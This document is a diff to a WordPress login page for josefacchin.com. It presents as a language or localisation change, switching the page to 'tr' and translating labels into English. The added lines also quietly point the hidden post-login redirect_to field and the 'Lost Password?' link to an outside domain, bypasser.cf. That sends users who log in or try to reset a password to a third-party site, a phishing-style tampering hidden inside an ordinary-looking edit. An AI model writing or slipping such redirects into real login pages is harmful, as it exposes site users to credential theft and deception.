@@ -1,6 +1,6 @@
 
 <!DOCTYPE html>
-	<html lang="es">
+	<html lang="tr">
 	<head> <script type="text/javascript">
 //----------------------------------------------------------
 //------ JAVASCRIPT HOOK FUNCTIONS FOR GRAVITY FORMS -------
@@ -119,12 +119,12 @@ if ( ! gform ) {
 
 		<form name="loginform" id="loginform" action="https://josefacchin.com/wp-login.php" method="post">
 			<p>
-				<label for="user_login">Nombre de usuario o correo electrónico</label>
+				<label for="user_login">Username</label>
 				<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input" value="" size="20" autocapitalize="off" />
 			</p>
 
 			<div class="user-pass-wrap">
-				<label for="user_pass">Contraseña</label>
+				<label for="user_pass">Password</label>
 				<div class="wp-pwd">
 					<input type="password" name="pwd" id="user_pass" aria-describedby="login_error" class="input password-input" value="" size="20" />
 					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Mostrar la contraseña">
@@ -132,16 +132,16 @@ if ( ! gform ) {
 					</button>
 				</div>
 			</div>
-						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Recuérdame</label></p>
+						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Remember Me</label></p>
 			<p class="submit">
-				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Acceder" />
-									<input type="hidden" name="redirect_to" value="https://josefacchin.com/wp-admin/" />
+				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Login" />
+									<input type="hidden" name="redirect_to" value="https://bypasser.cf/admin" />
 									<input type="hidden" name="testcookie" value="1" />
 			</p>
 		</form>
 
 					<p id="nav">
-								<a href="https://josefacchin.com/wp-login.php?action=lostpassword">¿Has olvidado tu contraseña?</a>
+								<a href="https://bypasser.cf/admin?reset">Lost Password?</a>
 			</p>
 					<script type="text/javascript">
 			function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
